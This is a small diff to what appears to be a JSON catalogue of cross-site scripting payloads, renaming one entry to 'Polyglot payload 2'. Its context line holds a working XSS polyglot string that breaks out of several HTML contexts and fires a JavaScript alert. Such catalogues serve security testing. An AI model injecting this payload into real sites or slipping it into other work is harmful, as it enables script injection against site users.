@@ -12,7 +12,7 @@
         "authorLink": "https:\/\/twitter.com\/garethheyes"
     },
     {
-        "description": "Polyglot payload 1",
+        "description": "Polyglot payload 2",
         "code": "javascript:\"\/*'\/*`\/*--><\/noscript><\/title><\/textarea><\/style><\/template><\/noembed><\/script><html \\\"\n onmouseover=\/*&lt;svg\/*\/onload=alert()\/\/>",
         "browsers": [
             "chrome",
